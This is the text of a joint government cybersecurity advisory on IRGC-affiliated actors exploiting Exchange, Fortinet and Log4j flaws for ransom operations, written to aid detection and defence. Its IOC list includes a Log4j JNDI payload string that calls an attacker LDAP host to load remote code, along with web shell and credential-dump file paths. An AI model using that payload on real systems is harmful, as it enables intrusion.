The authoring agencies now judge\nthese actors are an APT group affiliated with the IRGC.\nSince the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors\nExploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity from May 2021, the authoring\nagencies have continued to observe these IRGC-affiliated actors exploiting known vulnerabilities for\ninitial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring\nagencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial\naccess. The IRGC-affiliated actors have used this access for follow-on activity, including disk\nencryption and data extortion, to support ransom operations.\nThe IRGC-affiliated actors are actively targeting a broad range of entities, including entities across\nmultiple U.S. critical infrastructure sectors as well as Australian, Canadian, and United Kingdom\norganizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater\nLLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring\nagencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than\ntargeting specific targeted entities or sectors.\nThis advisory provides observed tactics, techniques and indicators of compromise (IOCs), that the\nauthoring agencies assess are likely associated with this IRGC-affiliated APT. The authoring\nagencies urge organizations, especially critical infrastructure organizations, to apply the\nrecommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from\nthese IRGC- affiliated cyber actors.\nFor a downloadable copy of IOCs, see AA22-257A.stix.\nFor more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber\nThreat Overview and Advisories webpage and the FBI’s Iran Threat webpage.\n\nTECHNICAL DETAILS\nThreat Actor Activity\nAs reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft\nExchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the authoring agencies\nhave observed Iranian government-sponsored APT actors scanning for and/or exploiting the following\nknown Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial\naccess to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591,\nand CVE-2021-34473 (a ProxyShell vulnerability). The authoring agencies have also observed these\nAPT actors leveraging CVE-2021-34473 against U.S. networks in combination with ProxyShell\nvulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iran-based\ncompany Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC\njudges that these APT actors have used CVE-2021-34473 in Australia to gain access to systems. The\n\nTLP: WHITE\nPage 2 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\nAPT actors can leverage this access for further malicious activities, including deployment of tools to\nsupport ransom and extortion operations, and data exfiltration.\nSince the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known\nvulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange\nvulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon\nLog4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and CVE-2021-45105 for\ninitial access.\nThe IRGC-affiliated actors have used their access for ransom operations, including disk encryption\nand extortion efforts. After gaining access to a network, the IRGC-affiliated actors likely determine a\ncourse of action based on their perceived value of the data. Depending on the perceived value, the\nactors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use the\nexfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor\nuses a combination of encryption and data theft to pressure targeted entities to pay ransom demands.\nIRGC-affiliated actor activity observed by the authoring agencies includes:\n•\n\n•\n\n•\n\n•\n\nIn December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473,\nCVE-2021-34523, and CVE-2021-31207) on a Microsoft Exchange server to gain access to\nthe network of a U.S. police department. The actors used their access to move laterally within\nthe network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.\nIn December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473,\nCVE-2021-34523, and CVE-2021-31207), on a Microsoft Exchange server to gain access to\nthe network of a U.S. regional transportation company. The actors used their access to move\nlaterally within the network, encrypt network devices with BitLocker, and hold the decryption\nkeys for ransom. This activity disrupted the transportation company’s operations for an\nextended period.\nIn February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE2021-45046, and/or CVE-2021-45105) in a VMware Horizon application to gain access to the\nnetwork of a U.S. municipal government, move laterally within the network, establish\npersistent access, initiate crypto-mining operations, and conduct additional malicious activity.\nIn February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228,\nCVE-2021-45046, and/or CVE-2021) to gain access to the network of a U.S. aerospace\ncompany. The actors leveraged a server that the authoring agencies assess is associated with\nthe IRGC-affiliated actors to exfiltrate data from the company's network.\n\nMITRE ATT&CK® Tactics and Techniques\nNote: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix B\nfor a table of the MITRE ATT&CK tactics and techniques observed.\nThe authoring agencies assess the following tactics and techniques are associated with this activity.\n\nTLP: WHITE\nPage 3 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\n\nResource Development [TA0042]\n\nThe IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001,\nT1588.002] for a variety of tactics across the enterprise spectrum:\n•\n•\n•\n•\n•\n\nFast Reverse Proxy (FRP) for command and control (C2)\nPlink for C2\nRemote Desktop Protocol (RDP) for lateral movement\nBitLocker for data encryption\nSoftPerfect Network Scanner for system network configuration discovery\n\nNote: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian\nGovernment-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities\nin Furtherance of Malicious Activities.\n\nInitial Access [TA0001]\n\nAs stated in the Technical Details section previously reported in joint CSA Iranian GovernmentSponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in\nFurtherance of Malicious Activities, the IRGC-affiliated actors gained initial access by exploiting\nknown vulnerabilities [T1190].\nThe following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation\non targeted entity networks:\n•\n\nWeb shells with naming conventions aspx_[11 randomly generated alphabetic\ncharacters].aspx, login.aspx, or default.aspx in any of the following directories:\no C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\\no C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\\no C:\\inetpub\\wwwroot\\aspnet_client\\\n\nThe following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation\non targeted entity networks:\n•\n•\n\n${jdni:ldap//148.251.71.182:1389/RCE} (user agent string)\nRCE.class\n\nExecution [TA0002]\n\nThe IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These\nmodifications may display as unrecognized scheduled tasks or actions. Specifically, the below\nestablished tasks may be associated with this activity:\n•\n•\n•\n\nWininet\nWininet’\nWinLogon\n\nTLP: WHITE\nPage 4 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\n•\n\nCacheTask\n\nNote: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For\nadditional tasks used by these IRGC-affiliated cyber actors, see joint CSA Iranian GovernmentSponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in\nFurtherance of Malicious Activities.\n\nPersistence [TA0003]\n\nThe IRGC-affiliated actors established new user accounts on domain controllers, servers,\nworkstations, and active directories [T1136.001, T1136.002]. The actors enabled a built-in Windows\naccount (DefaultAccount) and escalated privileges to gain administrator-level access to a network.\nSome of these accounts appear to have been created to look similar to other existing accounts on the\nnetwork, so specific account names may vary per organization. In addition to unrecognized user\naccounts or accounts established to masquerade as existing accounts, the following account\nusernames may be associated with this activity:\n•\n•\n•\n•\n\nDomain Admin\nit_admin\nDefaultAccount\nDefault01\n\nNote: For additional account usernames associated with this activity, see joint CSA Iranian\nGovernment-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities\nin Furtherance of Malicious Activities.\n\nExfiltration [TA0010]\n\nThe authoring agencies have observed the IRGC-affiliated actors dumping and subsequently\nexfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted\nentity networks in furtherance of credential harvesting. The following IOCs are associated with data\nexfiltration from targeted entity networks:\n•\n•\n•\n•\n\nC:\\Windows\\Temp\\sassl[.]pmd\nC:\\Windows\\Temp\\ssasl[.]zip\nC:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\lsass[.]dmp\nC:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\lsass[.]zip\n\nImpact [TA0040]\n\nThe IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and\nheld the decryption keys for ransom. The corresponding ransom notes were sent to the targeted\nentity, left on the targeted entity network as a .txt file or printed on the targeted entity’s networked\nprinter(s). The notes included the following contact information:\n•\n•\n\n@BuySafety (Telegram)\n@WeRBits (Telegram)\n\nTLP: WHITE\nPage 5 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\n•\n•\n•\n•\n•\n\n+93794415076 (Telegram)\n+93794415076 (WhatsApp)\nwerbits@onionmail[.]org\nbuysafety@onionmail[.]org\nyacashcash@rambler[.]ru\n\nNote: For additional contact information included in ransom notes, see joint CSA Iranian\nGovernment-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities\nin Furtherance of Malicious Activities.\n\nDETECTION\nThe authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet\ndevices, and/or VMware Horizon applications investigate potential suspicious activity in their\nnetworks.\n• Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts.\nNote: Refer to Appendix A for IOCs.\n• Review Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-202145105.\n• Review Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-202134523, and CVE-2021-31207.\n• As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-202131196, CVE-2021-31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470\nbecause the authoring agencies have seen the actors broadly target Microsoft Exchange\nservers.\n• Investigate exposed Microsoft Exchange servers, both patched and unpatched, for\ncompromise.\n• Review Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and\nCVE-2019-5591.\n• Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware\nsecurity advisory page.\n• Investigate changes to RDP, firewall, and Windows Remote Management (WinRM)\nconfigurations that may allow malicious cyber actors to maintain persistent access.\n• Review domain controllers, servers, workstations, and active directories for new or\nunrecognized user accounts.\n• Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review\noperating-system and scheduled tasks—including each step these tasks perform—for\nunrecognized “actions.”\n• Review antivirus logs for indications they were unexpectedly turned off.\n• Look for WinRAR and FileZilla in unexpected locations.\n\nTLP: WHITE\nPage 6 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\n•\n\nReview servers and workstations for malicious executable files masquerading as legitimate\nWindows processes. Malicious files may not be found in the expected directory and may have\ncmd.exe or powershell.exe as their parent process.\n\nNote: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical\nApproaches to Uncovering and Remediating Malicious Activity, authored by CISA and the\ncybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.\n\nMITIGATIONS\nThe authoring agencies urge network defenders to prepare for and mitigate potential cyber threats\nimmediately by implementing the mitigations below.\n\nImplement and Enforce Backup and Restoration Policies and Procedures\n•\n\n•\n•\n•\n\nMaintain offline (i.e., physically disconnected) backups of data, and regularly test\nbackup and restoration. These practices safeguard an organization’s continuity of\noperations or at least minimize potential downtime from a ransomware or other destructive\ndata incident and protect against data losses.\no Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted),\nand covers the entire organization’s data infrastructure.\nActivate BitLocker on all networks and securely back up BitLocker keys with Microsoft and\nwith an independent offline backup.\nCreate, maintain, and exercise a basic cyber incident response plan that includes response\nprocedures for a ransom incident.\nImplement a recovery plan to maintain and retain multiple copies of sensitive or proprietary\ndata and servers in a physically separate, segmented, secure location (e.g., hard drive,\nstorage device, the cloud).\n\nPatch and Update Systems\n•\n\n•\n\n•\n\nU.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure\norganization organizations: Implement free CISA Cyber Hygiene Services Vulnerability\nScanning to enable continuous scans of public, static IPs for accessible services and\nvulnerabilities.\nInstall updates/patch operating systems, software, and firmware as soon as updates/patches\nare released. Regularly check software updates and end-of-life notifications. Consider\nleveraging a centralized patch management system to automate and expedite the process.\nImmediately patch software affected by vulnerabilities identified in this advisory: CVE-202134473, CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-202131207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-31196, CVE-202131206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.\n\nEvaluate and Update Blocklists and Allowlists\n\nTLP: WHITE\nPage 7 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\n•\n•\n\nRegularly evaluate and update blocklists and allowlists.\nIf FortiOS is not used by your organization, add the key artifact files used by FortiOS to your\norganization’s execution blocklist. Prevent any attempts to install or run this program and its\nassociated files.\n\nImplement Network Segmentation\n•\n\nImplement network segmentation to restrict a malicious threat actor’s lateral movement.\n\nSecure User Accounts\n•\n•\n\nAudit user accounts with administrative privileges and configure access controls under the\nprinciples of least privilege and separation of duties.\nRequire administrator credentials to install software.\n\nImplement Multifactor Authentication\n•\n\nUse multifactor authentication where possible, particularly for webmail, virtual private networks\n(VPNs), accounts that access critical systems, and privileged accounts that manage backups.\n\nUse Strong Passwords\n•\n\nRequire all accounts with password logins to have strong, unique passwords. See CISA Tip\nChoosing and Protecting Passwords and National Institute of Standards and Technology\n(NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.\n\nSecure and Monitor RDP and other Potentially Risky Services\n•\n\n•\n•\n\nIf you use RDP, restrict it to limit access to resources over internal networks. After assessing\nrisks, if your organization deems RDP operationally necessary, restrict the originating sources,\nand require MFA to mitigate credential theft and reuse. If RDP must be available externally,\nuse a VPN, virtual desktop infrastructure, or other means to authenticate and secure the\nconnection before allowing RDP to connect to internal devices.\nDisable unused remote access/RDP ports.\nMonitor remote access/RDP logs, enforce account lockouts after a specified number of\nattempts (to block brute force campaigns), and log RDP login attempts.\n\nUse Antivirus Programs\n•\n\nInstall and regularly update antivirus and anti-malware software on all hosts.\n\nSecure Remote Access\n•\n•\n\nOnly use secure networks.\nConsider installing and using a VPN for remote access.\n\nTLP: WHITE\nPage 8 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\n\nVALIDATE SECURITY CONTROLS\nIn addition to applying mitigations, the authoring agencies recommend exercising, testing, and\nvalidating your organization's security program against the threat behaviors mapped to the MITRE\nATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your\nexisting security controls inventory to assess how they perform against the ATT&CK techniques\ndescribed in this advisory.\nTo get started:\n1.\n2.\n3.\n4.\n5.\n\nSelect an ATT&CK technique described in this advisory (see Appendix B).\nAlign your security technologies against the technique.\nTest your technologies against the technique.\nAnalyze your detection and prevention technologies performance.\nRepeat the process for all security technologies to obtain a set of comprehensive performance\ndata.\n6. Tune your security program, including people, processes, and technologies, based on the\ndata generated by this process.\nThe authoring agencies recommend continually testing your security program, at scale, in a\nproduction environment to ensure optimal performance against the MITRE ATT&CK techniques\nidentified in this advisory.\n\nRESPONDING TO RANSOMWARE OR EXTORTION INCIDENTS\nIf a ransomware or extortion incident occurs at your organization:\n• Follow the Ransomware Response Checklist on page 11 of the CISA-Multi-State Information\nSharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.\n• Scan backups. If possible, scan backup data with an antivirus program to check that it is free\nof malware. This should be performed using an isolated, trusted system to avoid exposing\nbackups to potential compromise.\n• Follow the notification requirements as outlined in your cyber incident response plan.\no U.S. organizations: Report incidents to the FBI at a local FBI Field Office or the FBI\n24/7 CyWatch at (855)292-3937 or cywatch@fbi.gov, CISA’s 24/7 Operations Center at\nreport@cisa.gov or (888) 282-0870, or the U.S. Secret Service (USSS) at a USSS Field\nOffice.\no Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to\nreport cybersecurity incidents and access alerts and advisories.\no Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.\no United Kingdom organizations: Report a significant cyber security\nincident: ncsc.gov.uk/report-an-incident (monitored 24 hours)\n•\n\nApply incident response best practices found in the joint Cybersecurity Advisory, Technical\nApproaches to Uncovering and Remediating Malicious Activity, developed by CISA and the\ncybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.\n\nTLP: WHITE\nPage 9 of 15 | Product ID: AA22-257A\n\nTLP:WHITE\nNote: The authoring agencies strongly discourage paying ransoms as doing so does not guarantee\nfiles and records will be recovered and may pose sanctions risks.\n\nRESOURCES\n•\n\n•\n•\n\n•\n\n•\n\n•\n\nThe U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to\n$10 million for reports of foreign government malicious activity against U.S. critical\ninfrastructure.
